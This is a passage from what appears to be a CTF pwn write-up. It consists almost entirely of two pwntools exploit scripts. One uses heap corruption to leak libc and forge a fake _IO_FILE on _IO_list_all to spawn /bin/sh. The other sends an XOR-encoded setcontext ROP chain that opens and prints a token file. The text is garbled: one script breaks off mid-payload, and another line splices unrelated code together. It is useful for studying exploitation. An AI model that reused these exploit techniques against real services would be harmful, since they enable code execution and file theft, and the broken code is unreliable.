        sla('size of it', str(sz))
        sla('name', na)
    def dp():
        sla('away\n', '3')
    def finish():
        ia()
        c()
    def exploit():
        li('exploit...')
        io.sendlineafter(':', 'test_team')
        io.sendlineafter(':', 'test_user')
        io.recvline()
        heap = io.recvuntil(b'\n',drop=True).ljust(8, b'\x00')
        heap = int(heap,16)
        print("heap",hex(heap))
        ad(0x20,"aaaa")
        ad(0xbd0+0x420,"aaaa")
        ad(0x20,"bbbb")
        md(0x40,b"A"*0x20 + p64(0) +p64(0xf81))
        #gdb.attach(io)
        ad(0x1000,"AAAA")
        ad(0x40,"BBBBBBBB")
        dp() 
        io.recvuntil("BBBBBBBB")
        area = u64(io.recvuntil(b'\x7f').ljust(8, b'\x00')) - 1514
        malloc = area  - 0x10
        libc_base = malloc - libc.sym['__malloc_hook']
        io_list_all = libc_base + libc.symbols['_IO_list_all']
        system = libc_base + libc.symbols['system']
        print("area             ",hex(area))
        print("malloc           ",hex(malloc))
        print("io_list_all      ",hex(io_list_all))
        print("system           ",hex(system))
        print("heap",hex(heap))
        #gdb.attach(io)
        payload = b'a' * 0x40
        fake_file = b'/bin/sh\x00'+p64(0x61)#to small bin
        fake_file += p64(0)+p64(io_list_all-0x10)
        fake_file += p64(0) + p64(1)#_IO_write_base 
**Exp**
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    from pwn import *
    from sys import *
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level = 'debug'
    #context(arch = 'amd64', os = 'linux', log_level='debug')
    exeFile  = "./pwn"
    libFile  = "./libc.so.6"
    LOCAL = 0
    LIBC = 1
    XorTable = [
            0xbe, 0xd1, 0x90, 0x88, 0x57, 0x00, 0xe9, 0x53, 0x10, 0xbd, 0x2a, 0x34, 0x51, 0x84, 0x07, 0xc4, 
            0x33, 0xc5, 0x3b, 0x53, 0x5f, 0xa8, 0x5d, 0x4b, 0x6d, 0x22, 0x63, 0x5d, 0x3c, 0xbd, 0x47, 0x6d, 
            0x22, 0x3f, 0x38, 0x4b, 0x7a, 0x4c, 0xb8, 0xcc, 0xb8, 0x37, 0x78, 0x17, 0x73, 0x23, 0x27, 0x71, 
            0xb1, 0xc7, 0xa6, 0xd1, 0xa0, 0x48, 0x21, 0xc4, 0x1b, 0x0a, 0xad, 0xc9, 0xa5, 0xe6, 0x14, 0x18, 
            0xfc, 0x7b, 0x53, 0x59, 0x8b, 0x0d, 0x07, 0xcd, 0x07, 0xcc, 0xbc, 0xa5, 0xe0, 0x28, 0x0e, 0xf9, 
            0x31, 0xc8, 0xed, 0x78, 0xf4, 0x75, 0x60, 0x65, 0x52, 0xb4, 0xfb, 0xbf, 0xac, 0x6e, 0xea, 0x5d, 
            0xca, 0x0d, 0xb5, 0x66, 0xac, 0xba, 0x06, 0x30, 0x95, 0xf4, 0x96, 0x42, 0x7a, 0x7f, 0x58, 0x6d, 
            0x83, 0x8e, 0xf6, 0x61, 0x7c, 0x0e, 0xfd, 0x09, 0x6e, 0x42, 0x6b, 0x1e, 0xb9, 0x14, 0x22, 0xf6, 
            0x16, 0xd2, 0xd2, 0x60, 0x29, 0x23, 0x32, 0x9e, 0xb4, 0x82, 0xee, 0x58, 0x3a, 0x7d, 0x1f, 0x74, 
            0x98, 0x5d, 0x17, 0x64, 0xe4, 0x6f, 0xf5, 0xad, 0x94, 0xaa, 0x89, 0xe3, 0xbe, 0x98, 0x91, 0x38, 
            0x70, 0xec, 0x2f, 0x5e, 0x9f, 0xc9, 0xb1, 0x26, 0x3a, 0x64, 0x48, 0x13, 0xf1, 0x1a, 0xc5, 0xd5, 
            0xe5, 0x66, 0x11, 0x11, 0x3a, 0xaa, 0x79, 0x45, 0x42, 0xb4, 0x57, 0x9d, 0x3f, 0xbc, 0xa3, 0xaa, 
            0x98, 0x4e, 0x6b, 0x7a, 0x4a, 0x2f, 0x3e, 0x10, 0x7a, 0xc5, 0x33, 0x8d, 0xac, 0x0b, 0x79, 0x33, 
            0x5d, 0x09, 0xfc, 0x9d, 0x9b, 0xe5, 0x18, 0xcd, 0x1c, 0x7c, 0x8b, 0x0a, 0xa8, 0x95, 0x56, 0xcc, 
            0x4e, 0x34, 0x31, 0x33, 0xf5, 0xc1, 0xf5, 0x03, 0x0a, 0x4a, 0xb4, 0xd1, 0x90, 0xf1, 0x8f, 0x57, 
            0x20, 0x05, 0x0d, 0xa0, 0xcd, 0x82, 0xb3, 0x25, 0xd8, 0xd2, 0x20, 0xf3, 0xc5, 0x96, 0x35, 0x35, 
        ]
    def Encode(keys, data):
        key_arr = []
        raw_key = []
        data_arr = []
        for c in keys:
            key_arr.append(c)
            raw_key.append(c)
        for c in data:
            data_arr.append(c)
        keys = key_arr
        data = data_arr
        for i in range(len(data)):
            n = ((keys[i & 7] + keys[(i + 1) & 7]) * keys[(i + 2) & 7] + keys[(i + 3) & 7]) & 0xff
            data[i] ^= n ^ XorTable[n]
            keys[i & 7] = (n * 2 + 3) & 0xff
            if((i & 0xf) == 0):
                keys = KeyRandom(raw_key, XorTable[i & 0xff])
        out = b''
        for c in data:
            out += c.to_bytes(1, byteorder='little')
        return out
    def KeyRandom(raw_key, seed):
        out_key = []
        for c in range(8):
            out_key.append(0)
        for i in range(8):
            out_key[i] = (raw_key[i] ^ XorTable[raw_key[i]]) & 0xff;
            out_key[i] ^= (seed + i) & 0xff;
        return out_key
    if(LOCAL == 0):
        if(len(argv)  rdx
        p =  p64(1) + p64(heap) # set to rdx
        p += p64(setcontext)
        p = p.ljust(0x90, b'\x11')
        p += p64(heap + 0xb0) # rsp
        p += p64(ret) # rcx
        rop  = p64(pop_rdi) + p64(heap + 0xb0 + 0x98 + 0x18)
        rop += p64(pop_rsi) + p64(0)
        rop += p64(pop_rdx_r12) + p64(0) + p64(0)
        rop += p64(libc_open)
        rop += p64(pop_rdi) + p64(3)
        rop += p64(pop_rsi) + p64(heap)
        rop += p64(pop_rdx_r12) + p64(0x80) + p64(0)
        rop += p64(libc_read)
        rop += p64(pop_rdi) + p64(1)
        rop += p64(libc_write)
        rop += p64(pop_rdi) + p64(0)
        rop += p64(libc_read)
        p += rop
        p += b'./sky_token\x00'
        add(0x800, Encode(key, p) + b'\n') # 13
        #print('heap: ' + hex(heap))
        print('get flag...')
        print('heap: ' + hex(heap))
        #gdb.attach(io)
        delete(17)
    if __name__ == '__main__':
        if LOCAL:
            exe = ELF(exeFile)
            if LIBC:
                libc = ELF(libFile)
                io = exe.process()
                #io = exe.process(env = {"LD_PRELOAD" : libFile})
            else:
                io = exe.process()
        else:
            exe = ELF(exeFile)
            io = remote(host, port)
            if LIBC:
                libc = ELF(libFile)
        exploit()
        io.interactive()